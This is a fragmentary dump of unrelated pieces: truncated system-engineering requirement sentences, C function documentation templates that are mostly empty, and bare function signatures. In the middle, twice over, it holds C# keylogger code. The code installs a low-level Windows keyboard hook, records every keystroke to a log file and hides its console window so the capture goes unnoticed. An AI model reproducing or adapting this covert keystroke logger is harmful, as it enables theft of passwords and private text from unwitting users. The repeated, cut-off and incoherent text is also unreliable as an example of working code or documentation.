The system shall be tested in accordance with all relevant standards unless a derogation or TNC has been granted and with all applicable legislation. Where it is necessary to 

All interfaces between subsystems shall be designed so that the overall behaviour of the system is as intended. Allowance shall be made for differences in the manner in which 

All interfaces between subsystems shall be designed so that the overall behaviour of the system is as intended. Allowance shall be made for differences in the manner in which the different subsystems respond to input stimuli such as differences in response time by equipment using different technologies and indeterminate effects that arise from asynchronous operating cycles in different subsystems. It shall be confirmed that the effects of reasonably foreseeable unintended behaviour of any subsystem does not result in dangerous behaviour arising in any other subsystem.


thread = new System.Threading.Thread(new System.Threading.ThreadStart(ReceiveThread));

thread.Start();

[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

// The two dll imports below will handle the window hiding.

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

private const int WH_KEYBOARD_LL = 13;
private const int WM_KEYDOWN = 0x0100;
private static LowLevelKeyboardProc _proc = HookCallback;
private static IntPtr _hookID = IntPtr.Zero;

 private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)vkCode);
            StreamWriter sw = new StreamWriter(Application.StartupPath+ @"\log.txt",true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

   var handle = GetConsoleWindow();

        // Hide
        ShowWindow(handle, SW_HIDE);

_hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);

 private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;


        private delegate IntPtr LowLevelKeyboardProc(
       int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                sw.Write((Keys)vkCode);
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // The two dll imports below will handle the window hiding.

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

 var handle = GetConsoleWindow();

        // Hide
        ShowWindow(handle, SW_HIDE);

        _hookID = SetHook(_proc);

/**
<pre>
FUNCTION:                                                                  
  void GetDecodeStats(DWORD *goodC, DWORD *badC, DWORD *goodA, DWORD *badA)

DESCRIPTION:                                                               
  Access function for the global variables counting good and failed NVFB3  
  decodes                                                                  

PARAMETERS:                                                                
  DWORD *goodC      Output parameter to contain good control request count 
  DWORD *badC       Output parameter to contain bad control request count  
  DWORD *goodA      Output parameter good ARS subarea status request count 
  DWORD *badA       Output parameter bad ARS subarea status request count  

RETURNS:                                                                   
  void                                                                     
</pre>
*/

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

void InitialiseConnectionInformation()


/**
<pre>
FUNCTION:                                                                  
  void InitialiseConnectionInformation()
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

ConnectionListInformation_t * GetConnection(WORD index)

/**
<pre>
FUNCTION:                                                                  
  ConnectionListInformation_t * GetConnection(WORD index)

DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

ConnectionListInformation_t *GetConnectionInformation(DWORD Socket)

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

WORD HandleIncomingDataStream(DWORD Socket, const char *request);

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/


void CALLBACK IconisTransmitPeriod(UINT wTimerID, UINT msg, DWORD dwUser, DWORD dw1, DWORD dw2);

periodically called every 250ms

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/


/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

will crate a new connection or extract one thats already in use.

void CreateNewConnection(DWORD Socket, char *ipaddress);

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

void CloseAConnection(DWORD Socket)

DWORD Socket

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

WORD isMaster(WORD connectionID)

WORD connectionID

UINT wTimerID, UINT msg, DWORD dwUser, DWORD dw1, DWORD dw2

DWORD Socket, const char *request

WORD

DWORD Socket

WORD index

ConnectionListInformation_t *

WORD printConnectionInformationToString(char *output, WORD n)

char *output, WORD n

WORD printConnectionStatInformationToString(char *output, WORD n)

char *output, WORD n

